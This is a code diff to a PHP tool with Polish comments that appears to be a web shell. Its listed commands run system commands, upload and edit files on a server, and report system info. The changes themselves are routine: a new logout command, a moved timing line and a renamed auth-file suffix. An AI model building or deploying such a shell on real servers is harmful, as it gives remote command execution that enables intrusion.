@@ -39,7 +39,8 @@ modules - Informacje o modułach
 edit - Edycja oraz tworzenie nowego pliku
 upload - Wrzucanie pliku na serwer
 system, exec - Uruchomienie polecenia systemowego
-info - Wyświetla informacje o systemie';
+info - Wyświetla informacje o systemie
+logout - Wylogowanie';
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -250,6 +251,11 @@ info - Wyświetla informacje o systemie';
 	public function __construct()
 	{
 		/**
+		 * Czas generowania strony
+		 */
+		$this -> fGeneratedIn = microtime( 1 );
+
+		/**
 		 * Locale
 		 */
 		setLocale( LC_ALL, 'polish.UTF-8' );
@@ -258,11 +264,6 @@ info - Wyświetla informacje o systemie';
 		 * Naglowek UTF-8
 		 */
 		header( 'Content-type: text/html; charset=utf-8' );
-
-		/**
-		 * Czas generowania strony
-		 */
-		$this -> fGeneratedIn = microtime( 1 );
 
 		/**
 		 * @ignore
@@ -635,7 +636,7 @@ modules - Informacje o modułach
 		modules ścieżka_do_pliku_z_modułami
 
 	Przykład:
-		modules version
+		modules loaded
 		modules version
 		modules /tmp/modules
 		modules http://example.com/modules.txt
@@ -1043,6 +1044,53 @@ DATA;
 	}
 
 	/**
+	 * Wylogowanie
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandLogout()
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+logout - Wylogowanie
+
+	Użycie:
+		logout
+DATA;
+		}
+
+		/**
+		 * Sciezka do pliku
+		 */
+		$sFilepath = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth';
+
+		/**
+		 * Czy plik z autoryzacja istnieje
+		 */
+		if( is_file( $sFilepath ) )
+		{
+			/**
+			 * Usuwanie pliku
+			 */
+			if( unlink( $sFilepath ) )
+			{
+				return 'Zostałeś wylogowany';
+			}
+			else
+			{
+				return 'Nie zostałeś wylogowany';
+			}
+		}
+
+		return 'Nie jesteś zalogowany, więc nie możesz się wylogować !!!';
+	}
+
+	/**
 	 * Wrzucanie pliku
 	 *
 	 * @access private
@@ -1244,6 +1292,9 @@ DATA;
 				case 'info':
 					$sConsole = $this -> getCommandInfo();
 					break ;
+				case 'logout':
+					$sConsole = $this -> getCommandLogout();
+					break ;
 				case 'edit':
 					$mContent = $this -> getCommandEdit( $this -> sArgv );
 
@@ -1414,7 +1465,7 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		{
 			$sAuth = NULL;
 
-			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_session' )
+			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth' )
 			    && ( ( $sData = file_get_contents( $sAuthFilename ) ) !== FALSE )
 			)
 			{
